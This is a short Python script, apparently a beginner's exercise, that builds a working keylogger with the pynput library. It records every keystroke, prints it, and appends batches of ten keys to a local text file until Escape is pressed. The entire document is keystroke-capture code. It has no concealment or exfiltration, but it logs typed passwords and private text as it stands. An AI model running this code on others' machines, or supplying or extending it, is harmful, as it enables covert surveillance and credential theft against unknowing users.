#This below library allows you to control and monitor input devices
import pynput
from pynput.keyboard import Key, Listener
count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    
    if count >= 10:
        count = 0 
        write_file(keys)
        keys=[]

def write_file(keys):
    with open("File_path", "a") as f:#appends or adds the key logging to a text editor
        for key in keys:
            k=str(key).replace("'","")
            if k.find("enter")>0:
               f.write("\n")
            elif k.find(".space")>0:
               f.write(" ")
            elif k.find("Key") == -1:
               f.write(k)
def on_release(key):
    if key == Key.esc:#breaks when escape key is pressed
        return False

#functions called when a key is pressed
with Listener(on_press=on_press, on_release=on_release) as listener:
#this is going to constantly keep running this loop until we break out of it
    listener.join()
